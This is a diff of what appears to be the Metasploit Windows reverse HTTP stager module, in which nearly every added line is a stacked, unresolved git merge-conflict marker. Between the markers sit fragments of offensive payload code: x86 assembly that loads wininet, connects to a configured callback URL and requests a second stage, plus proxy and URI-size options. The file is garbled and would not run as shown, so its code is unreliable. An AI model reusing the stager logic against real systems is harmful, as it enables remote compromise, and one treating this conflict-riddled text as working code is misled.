@@ -4,6 +4,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
@@ -26,14 +27,21 @@ module Msf
 <<<<<<< HEAD
 >>>>>>> rapid7/feature/complex-payloads
 =======
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
 module Msf
 
 
+<<<<<<< HEAD
 >>>>>>> origin/feature/complex-payloads
 =======
+=======
+>>>>>>> origin/msf-complex-payloads
 =======
 =======
 >>>>>>> rapid7/master
@@ -63,6 +71,9 @@ module Msf
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
 ###
 #
@@ -73,6 +84,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 module Payload::Windows::ReverseHttp
 
   include Msf::Payload::TransportConfig
@@ -94,6 +106,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 
@@ -130,6 +144,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
 
   #
@@ -140,8 +157,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
     register_advanced_options(
@@ -156,6 +176,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
@@ -165,6 +188,7 @@ module Payload::Windows::ReverseHttp
         OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
         OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
         OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
+<<<<<<< HEAD
 <<<<<<< HEAD
 =======
     register_advanced_options(
@@ -178,6 +202,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -190,6 +216,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
       ], self.class)
   end
@@ -200,8 +229,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
   def generate
@@ -231,6 +263,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
   def generate(opts={})
     conf = {
@@ -256,6 +291,7 @@ module Payload::Windows::ReverseHttp
     end
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
@@ -283,6 +319,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -295,6 +333,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
     generate_reverse_http(conf)
   end
@@ -317,8 +358,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
   # TODO: Use the CachedSize instead (PR #4894)
@@ -333,12 +377,16 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
   #
   # Generate the transport-specific configuration
   #
   def transport_config(opts={})
     transport_config_reverse_http(opts)
+<<<<<<< HEAD
 <<<<<<< HEAD
 =======
   # TODO: Use the CachedSize instead (PR #4894)
@@ -352,6 +400,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -364,6 +414,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
   end
 
@@ -374,8 +427,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
     # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
@@ -406,6 +462,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
 
     uri_req_len = datastore['StagerURILength'].to_i
@@ -428,6 +487,7 @@ module Payload::Windows::ReverseHttp
   def generate_small_uri
     generate_uri_uuid_mode(:init_native, 5)
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
@@ -456,6 +516,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -468,6 +530,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
   end
 
@@ -484,6 +549,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
     # Make room for the maximum possible URL length
     space += 256
 =======
@@ -496,6 +562,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
     # Add 251 bytes for large URI support (technically a little less, but lets go with it)
@@ -520,6 +588,9 @@ module Payload::Windows::ReverseHttp
     # Make room for the maximum possible URL length
     space += 256
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
@@ -528,6 +599,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
     # Proxy options?
     space += 200
 
@@ -537,6 +609,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -564,6 +638,9 @@ module Payload::Windows::ReverseHttp
     space += 200
 
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
     # The final estimated size
     space
@@ -573,8 +650,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
   # Dynamic payload generation
@@ -618,6 +698,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
   # Generate an assembly stub with the configured feature set and options.
   #
@@ -683,6 +766,7 @@ module Payload::Windows::ReverseHttp
         0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
         0x00000200 ) # INTERNET_FLAG_NO_UI
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
@@ -724,6 +808,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -736,11 +822,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
     end
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -766,6 +856,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
       ; Author: HD Moore
@@ -803,6 +895,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
@@ -814,8 +909,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 
@@ -850,6 +948,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
       ^
@@ -885,6 +986,7 @@ module Payload::Windows::ReverseHttp
       internetconnect:
         push ebx               ; DWORD_PTR dwContext (NULL)
 <<<<<<< HEAD
+<<<<<<< HEAD
         push ebx               ; dwFlags
         push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
 =======
@@ -918,6 +1020,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> origin/feature/complex-payloads
 =======
+=======
+>>>>>>> origin/msf-complex-payloads
         push ebx               ; dwFlags
         push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
 <<<<<<< HEAD
@@ -933,6 +1037,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
@@ -941,8 +1048,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
       server_uri:              ;  server_host; server_uri is saved in EDI for later
@@ -963,6 +1073,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
       server_uri:              ; server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
@@ -1012,6 +1125,7 @@ module Payload::Windows::ReverseHttp
       httpopenrequest:
         push ebx               ; dwContext (NULL)
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
@@ -1030,6 +1144,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1042,6 +1158,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
@@ -1049,6 +1168,7 @@ module Payload::Windows::ReverseHttp
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1061,6 +1181,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
         push eax               ; hConnection
@@ -1079,6 +1201,9 @@ module Payload::Windows::ReverseHttp
 =======
         push esi               ; hConnection
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
@@ -1087,8 +1212,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
       send_request:
@@ -1121,6 +1249,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
       ; Store our retry counter in the edi register
       set_retry:
@@ -1144,6 +1275,7 @@ module Payload::Windows::ReverseHttp
         call ebp
       ^
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
@@ -1174,6 +1306,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1186,6 +1320,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
     end
 
@@ -1209,8 +1346,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
       ^
@@ -1284,6 +1424,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
     ^
 
@@ -1349,6 +1492,7 @@ module Payload::Windows::ReverseHttp
     end
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
@@ -1420,6 +1564,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1432,6 +1578,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
     asm
   end
@@ -1453,6 +1602,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -1461,6 +1611,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 
@@ -1474,6 +1626,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> origin/msf-complex-payloads
 end
 
